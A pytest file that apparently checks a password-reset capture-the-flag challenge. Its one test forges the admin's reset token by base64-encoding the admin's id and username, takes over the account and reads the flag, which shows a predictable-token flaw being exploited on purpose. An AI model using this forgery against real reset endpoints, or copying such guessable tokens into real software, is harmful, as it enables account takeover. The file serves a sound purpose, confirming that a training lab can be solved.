import pytest
from app import create_app ,db, mail
import os, tempfile, json
from app.account.models import User
import base64
from os import getenv

mimetype = 'application/json'
headers = {
    'Content-Type': mimetype
}

@pytest.fixture
def app():
    app = create_app('reset')
    app.config.update({
        "TESTING": True,
    })

    yield app

@pytest.fixture()
def client(app):
    return app.test_client()

def setup_function():
    app = create_app('reset')
    with app.app_context():
        db.session.commit()
        db.drop_all()
        db.create_all()
        from app.challenge.reset import seed
        seed(app)
    return app
  
def teardown_function():
    os.remove('app.db')

class TestChallengeClass:    
  @classmethod
  def setup_class(self):
    app = setup_function()
    with app.app_context():
        User.insert_admin("admin","password")
        User.insert_user("user","password")
  @classmethod
  def teardown_class(self):
    teardown_function()

  def post_json(self,client, url ,data):
    return client.post(url, data=json.dumps(data), headers=headers)
  
  def put_json(self,client, url ,data):
    return client.put(url, data=json.dumps(data), headers=headers)

  def login_as_user(self, client):
    self.post_json(client,"/api/v1/auth/login",{"login": "user", "password": "password"})

  def logout(self, client):
    client.get("/api/v1/auth/logout")

  def login_as_admin(self, client):
    self.post_json(client,"/api/v1/auth/login",{"login": "admin", "password": "password"})
  
  def test_challenge_is_exploitable(self,client,app):
    User.insert_user("user","password")
    assert client.get("/api/v1/flag").status_code == 401
    self.login_as_user(client)
    assert client.get("/api/v1/flag").status_code == 401
    res = self.post_json(client,"/api/v1/auth/reset",{"login": "user", "password": "newadminpassword"}).json
    reset_token = res['message'].split(': ')[1]
    reset_request = client.post("/api/v1/auth/reset-password", data=json.dumps({"token": reset_token, "password": "newpassword"}), headers=headers)
    assert reset_request.status_code == 200
    assert self.post_json(client,"/api/v1/auth/login",{"login": "user", "password": "newpassword"}).json['status'] == "success"
    admin = User.query.filter_by(admin=True,username="admin").first()
    reset_request = client.post("/api/v1/auth/reset-password", data=json.dumps({"token": base64.urlsafe_b64encode("{}:{}".format(admin.id,admin.username).encode()).decode(), "password": "newadminpassword"}), headers=headers)
    assert reset_request.status_code == 200
    assert self.post_json(client,"/api/v1/auth/login",{"login": admin.username, "password": "newadminpassword"}).json['status'] == "success"
    assert client.get("/api/v1/flag").status_code == 200
    assert client.get("/api/v1/flag").json['message'] == getenv('FLAG')